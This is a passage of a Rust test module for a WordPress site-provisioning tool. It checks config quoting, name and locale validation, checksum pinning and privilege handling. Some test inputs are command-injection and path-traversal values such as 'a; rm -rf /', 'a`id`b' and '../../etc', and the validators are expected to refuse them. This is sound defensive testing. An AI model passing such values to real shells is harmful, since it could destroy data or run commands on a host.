        seen.dedup();
        assert_eq!(
            seen.len(),
            before,
            "salts repeated inside one wp-config.php"
        );
    }

    fn salt_of(rendered: &str, constant: &str) -> String {
        let needle = format!("define( '{constant}', '");
        let start = rendered
            .find(&needle)
            .unwrap_or_else(|| panic!("{constant} missing from wp-config.php"))
            + needle.len();
        let rest = &rendered[start..];
        rest[..rest.find('\'').expect("closing quote")].to_string()
    }

    /// A generated secret must never be able to end its own PHP string
    /// literal — that is how a config file becomes an execution vector.
    #[test]
    fn generated_secrets_can_never_end_their_php_literal() {
        for _ in 0..200 {
            let secret = random_secret(64);
            assert!(!secret.contains('\''), "{secret}");
            assert!(!secret.contains('\\'), "{secret}");
            assert!(php_single_quoted(&secret).is_ok());
        }
    }

    #[test]
    fn a_value_with_a_quote_is_refused_rather_than_escaped() {
        assert!(php_single_quoted("it's").is_err());
        assert!(php_single_quoted("back\\slash").is_err());
        assert!(php_single_quoted("new\nline").is_err());
        assert!(php_single_quoted("plain_value").is_ok());
    }

    /// The password is the point of rendering this file ourselves; it has to
    /// actually arrive, and the file has to be loadable PHP.
    #[test]
    fn the_rendered_config_carries_the_credentials_and_requires_wp_settings() {
        let rendered = render_wp_config(&WpConfig {
            db_name: "wp_shop_a1b2c3",
            db_user: "wp_shop_a1b2c3",
            db_password: "SuperSecret123",
            db_host: "localhost",
            table_prefix: "wp_",
        })
        .expect("renders");
        assert!(rendered.starts_with("<?php\n"));
        assert!(rendered.contains("define( 'DB_NAME', 'wp_shop_a1b2c3' );"));
        assert!(rendered.contains("define( 'DB_PASSWORD', 'SuperSecret123' );"));
        assert!(rendered.contains("define( 'DISALLOW_FILE_EDIT', true );"));
        assert!(
            rendered
                .trim_end()
                .ends_with("require_once ABSPATH . 'wp-settings.php';")
        );
    }

    // -- names, locales, titles --------------------------------------------

    /// MySQL account names are capped at 32 characters, and the derived name is
    /// used for both the database and its user.
    #[test]
    fn a_derived_database_name_is_valid_and_short_enough_for_mysql() {
        for domain in [
            "example.com",
            "a.io",
            "an-extremely-long-domain-name-that-goes-on.example.co.uk",
            "xn--mgbh0fb.example",
        ] {
            let name = derive_db_name(&Domain::parse(domain).unwrap()).expect("derives");
            assert!(name.as_str().len() <= 24, "{}", name.as_str());
            assert!(name.as_str().starts_with("wp_"));
            // DbName::parse already enforced the alphabet; restate the claim
            // that matters, which is that no quoting is ever needed.
            assert!(
                name.as_str()
                    .bytes()
                    .all(|b| b.is_ascii_alphanumeric() || b == b'_')
            );
        }
    }

    #[test]
    fn two_sites_on_similar_domains_get_different_database_names() {
        let domain = Domain::parse("blog.example.com").unwrap();
        let a = derive_db_name(&domain).unwrap();
        let b = derive_db_name(&domain).unwrap();
        assert_ne!(a.as_str(), b.as_str());
    }

    /// Persian is a first-class case in the spec, so it gets a test rather than
    /// a comment.
    #[test]
    fn persian_and_other_real_locales_parse_and_nonsense_does_not() {
        for good in ["fa_IR", "en_US", "pt_BR", "de", "zh_CN"] {
            assert_eq!(WpLocale::parse(good).unwrap().as_str(), good);
        }
        for bad in [
            "",
            "e",
            "en US",
            "en-US;rm -rf /",
            "../../etc",
            "en_US_extra_long",
        ] {
            assert!(WpLocale::parse(bad).is_err(), "{bad} must be refused");
        }
        assert_eq!(WpLocale::default().as_str(), "en_US");
    }

    /// A title reaches an argv, so it may be Unicode (a Persian site is the
    /// point) but never a line break or a shell word boundary.
    #[test]
    fn a_title_may_be_persian_but_never_a_command() {
        assert_eq!(validate_title("  وبلاگ من  ").unwrap(), "وبلاگ من");
        assert_eq!(validate_title("My Shop").unwrap(), "My Shop");
        for bad in ["", "a\nb", "a`id`b", "a; rm -rf /", &"x".repeat(201)] {
            assert!(validate_title(bad).is_err(), "{bad:?} must be refused");
        }
    }

    #[test]
    fn a_plugin_slug_is_a_slug_and_not_a_flag() {
        assert_eq!(validate_slug("woocommerce").unwrap(), "woocommerce");
        assert_eq!(validate_slug("wp-super-cache").unwrap(), "wp-super-cache");
        for bad in ["--all", "-x", "a/b", "a;b", "a b", ""] {
            assert!(validate_slug(bad).is_err(), "{bad:?} must be refused");
        }
    }

    // -- the pin -----------------------------------------------------------

    /// The pin is only worth having if the wrong bytes are actually refused.
    #[test]
    fn the_wrong_bytes_are_refused_and_the_right_ones_accepted() {
        let bytes = b"pretend this is a phar";
        let digest = hex::encode(Sha256::digest(bytes));
        assert!(verify_sha256(bytes, &digest).is_ok());

        let err = verify_sha256(bytes, WP_CLI_SHA256).expect_err("must refuse");
        assert_eq!(err.code, ErrorCode::PackageBackendFailed);
        assert!(
            err.detail.contains("Nothing was installed"),
            "the refusal must say nothing was installed: {}",
            err.detail
        );
    }

    /// A pin is a 64-hex string or it is a typo, and the provenance string is
    /// what tells an operator not to treat it as a signature check.
    #[test]
    fn the_pin_is_well_formed_and_declares_its_single_source() {
        assert_eq!(WP_CLI_SHA256.len(), 64);
        assert!(WP_CLI_SHA256.bytes().all(|b| b.is_ascii_hexdigit()));
        assert_eq!(
            WP_CLI_SIGNING_KEY_FPR.len(),
            40,
            "full fingerprint, never a short id"
        );
        assert!(WP_CLI_PIN_PROVENANCE.contains("single-source"));
        assert!(WP_CLI_URL.starts_with("https://"));
        assert!(WP_CLI_URL.contains(WP_CLI_VERSION));
    }

    /// A fetcher that answers over plain HTTP is refused before a byte is read:
    /// the checksum supplements transport security rather than replacing it.
    #[tokio::test]
    async fn the_phar_is_never_fetched_over_plain_http() {
        let err = HttpsPharFetcher
            .fetch("http://example.com/wp-cli.phar")
            .await
            .expect_err("must refuse");
        assert!(err.detail.contains("refusing to fetch"), "{}", err.detail);
    }

    // -- the runner --------------------------------------------------------

    /// The whole point of the module: on an unprivileged agent there is no
    /// privilege to drop, and on a root agent a tenant that resolves to root is
    /// a bug that must stop the operation rather than run WP-CLI as root.
    #[test]
    fn an_unprivileged_agent_runs_locally_and_never_pretends_to_drop() {
        // SAFETY: `geteuid` reads process state and cannot fail.
        let euid = unsafe { libc::geteuid() };
        let runner = WpRunner::for_user(&LinuxUser::parse("ft_test").unwrap());
        if euid != 0 {
            assert_eq!(runner.unwrap(), WpRunner::Local);
        } else {
            // As root the account has to exist; either way the assertion that
            // matters is that we never get a Tenant runner with uid 0.
            if let Ok(WpRunner::Tenant { uid, gid }) = runner {
                assert_ne!(uid, 0);
                assert_ne!(gid, 0);
            }
        }
    }
}
